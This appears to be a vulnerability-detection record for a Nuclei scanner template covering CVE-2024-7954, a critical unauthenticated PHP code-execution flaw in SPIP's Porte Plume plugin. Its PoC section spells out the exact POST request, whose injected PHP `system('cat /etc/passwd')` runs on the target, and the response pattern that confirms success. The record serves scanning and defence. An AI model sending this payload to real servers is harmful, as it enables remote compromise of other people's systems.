---
cve_id: CVE-2024-7954
template_path: nuclei-templates/http/cves/2024/CVE-2024-7954.yaml
affected_product: SPIP Porte Plume Plugin
severity: critical
authentication: none
external_callback: false
affected_versions: SPIP before 4.3.0-alpha2, 4.2.13, and 4.1.16
preconditions: []
poc_classification: rce
---

## Vulnerability

SPIP Porte Plume Plugin (used by SPIP) contains an arbitrary PHP code execution vulnerability. Remote unauthenticated attackers can execute arbitrary PHP as the SPIP user by sending a single crafted HTTP POST request to the `porte_plume_previsu` action, achieving complete server compromise and full control of the SPIP installation and its data. CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H); CWE-284.

## PoC / Detection

Classification: rce

The template sends one raw POST request to `/index.php?action=porte_plume_previsu` with `Content-Type: application/x-www-form-urlencoded` and body `data=AA_[<img111111>->URL`<?php system('cat /etc/passwd'); ?>`]_BB`. Success is confirmed if the response body matches regex `root:.*:0:0:`, the header contains `Composed-By: SPIP`, and status is 200.

## References

- https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-0-alpha2-SPIP-4-2-13-SPIP-4.html
- https://thinkloveshare.com/hacking/spip_preauth_rce_2024_part_1_the_feather/
- https://vulncheck.com/advisories/spip-porte-plume
- https://nvd.nist.gov/vuln/detail/CVE-2024-7954
- https://github.com/bigb0x/CVE-2024-7954
